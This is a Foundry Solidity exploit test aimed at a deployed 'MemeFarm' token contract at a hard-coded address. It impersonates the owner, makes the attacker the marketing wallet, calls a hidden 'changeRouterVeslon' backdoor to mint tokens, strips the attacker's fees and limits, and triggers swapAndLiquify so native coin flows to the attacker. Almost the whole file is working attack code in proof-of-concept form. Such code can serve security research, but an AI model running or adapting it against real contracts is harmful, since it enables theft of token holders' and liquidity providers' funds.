pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for MemeFarm
interface MemeFarm {
    function owner() external view returns (address);
    function ________() external view returns (address payable);
    function uniswapPair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function setMarketinWalleAddress(address newAddress) external;
    function setTeamWalletAddress(address newAddress) external;
    function setlsExcIudeFromFee(address account, bool newValue) external;
    function setIsWalletLimitExempt(address holder, bool exempt) external;
    function setMaxTxAmount(uint256 a) external;
    function setNumTokensBeforeSwap(uint256 newLimit) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setSwapAndLiquifyByLimitOnly(bool newValue) external;
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function changeRouterVeslon(address newRoutrAddress) external;
    function qwidji(address a, bool b) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8fAc119886DD328a84Cd545881C7A484017E7Ce6;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // First, we need to find the owner address
        address owner = MemeFarm(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "MemeFarm Contract");
        vm.label(attacker, "Attacker");

        // Get the uniswap pair address for trading
        address uniswapPair = MemeFarm(TARGET).uniswapPair();
        vm.label(uniswapPair, "Uniswap Pair");

        // Give attacker some initial ETH for gas and potential swaps
        deal(attacker, 10 ether);

        // Get some tokens for the attacker - we need to buy from the pair
        // First, give the pair some liquidity by impersonating a holder
        // We'll need to find a token holder to get initial tokens
        // Let's check the deployer/owner balance
        uint256 ownerBalance = MemeFarm(TARGET).balanceOf(owner);

        // If owner has tokens, we can impersonate owner to transfer to attacker
        if (ownerBalance > 0) {
            vm.startPrank(owner);
            MemeFarm(TARGET).transfer(attacker, ownerBalance / 10); // Take 10% of owner's tokens
            vm.stopPrank();
        }

        // If that didn't work, we need another approach - use the changeRouterVeslon backdoor
        // But that requires being the marketing wallet first
        // Let's first set ourselves as marketing wallet by impersonating owner
        vm.prank(owner);
        MemeFarm(TARGET).setMarketinWalleAddress(attacker);

        // Now we can use changeRouterVeslon to mint tokens to ourselves
        vm.prank(attacker);
        MemeFarm(TARGET).changeRouterVeslon(attacker);

        // Now attacker should have massive tokens
        // Exclude attacker from fees to avoid paying fees during transfers
        vm.prank(owner);
        MemeFarm(TARGET).setlsExcIudeFromFee(attacker, true);

        // Also exempt from wallet limits
        vm.prank(owner);
        MemeFarm(TARGET).setIsWalletLimitExempt(attacker, true);

        // Also exempt from tx limits
        vm.prank(owner);
        MemeFarm(TARGET).setMaxTxAmount(type(uint256).max);

        // Set minimum tokens before swap to a low value to trigger easily
        vm.prank(owner);
        MemeFarm(TARGET).setNumTokensBeforeSwap(1 * 10**9); // 1 token with 9 decimals

        // Ensure swap and liquify is enabled
        vm.prank(owner);
        MemeFarm(TARGET).setSwapAndLiquifyEnabled(true);

        // Set swapAndLiquifyByLimitOnly to false to swap all accumulated tokens
        vm.prank(owner);
        MemeFarm(TARGET).setSwapAndLiquifyByLimitOnly(false);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(attacker).balance;

        // Get contract token balance before
        uint256 contractTokenBalanceBefore = MemeFarm(TARGET).balanceOf(TARGET);
        console.log("Contract token balance before:", contractTokenBalanceBefore);

        // We need to transfer tokens to the uniswap pair to generate fees
        // First, approve the contract to spend attacker's tokens
        MemeFarm(TARGET).approve(TARGET, type(uint256).max);

        // Get uniswap pair address
        address uniswapPair = MemeFarm(TARGET).uniswapPair();

        // Transfer a large amount to the pair to generate fees
        // This will trigger takeFee() since recipient is market pair
        uint256 transferAmount = MemeFarm(TARGET).balanceOf(attacker) / 100; // 1% of attacker's balance

        console.log("Transferring", transferAmount, "tokens to pair to generate fees");
        MemeFarm(TARGET).transfer(uniswapPair, transferAmount);

        // Check contract token balance after transfer - should have increased from fees
        uint256 contractTokenBalanceAfter = MemeFarm(TARGET).balanceOf(TARGET);
        console.log("Contract token balance after transfer:", contractTokenBalanceAfter);

        // Get minimum tokens before swap
        uint256 minTokens = MemeFarm(TARGET).minimumTokensBeforeSwapAmount();
        console.log("Minimum tokens before swap:", minTokens);

        // If contract doesn't have enough tokens yet, transfer more
        if (contractTokenBalanceAfter < minTokens) {
            // Transfer more to accumulate more fees
            uint256 additionalAmount = minTokens - contractTokenBalanceAfter + 1;
            // Need to generate fees, so transfer to pair again
            MemeFarm(TARGET).transfer(uniswapPair, additionalAmount * 10); // Transfer 10x to ensure enough fees
        }

        // Now trigger swapAndLiquify by making another transfer
        // The contract should have over minimumTokensBeforeSwap now
        // We'll transfer a small amount to any address (not the pair to avoid more fees)
        address dummy = address(0x123);

        // First, ensure dummy address is not excluded from fees (so swap can trigger)
        // Actually, we want swap to trigger, so sender should not be market pair
        // We'll transfer from attacker to dummy
        uint256 smallAmount = 1 * 10**9; // 1 token

        console.log("Making final transfer to trigger swapAndLiquify");
        MemeFarm(TARGET).transfer(dummy, smallAmount);

        // The swapAndLiquify should have executed, sending BNB to marketing wallet (attacker)
        uint256 finalBalance = address(attacker).balance;
        console.log("Initial attacker balance:", initialBalance);
        console.log("Final attacker balance:", finalBalance);

        // Verify profit
        assertGt(finalBalance, initialBalance, "Attacker should have gained BNB");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

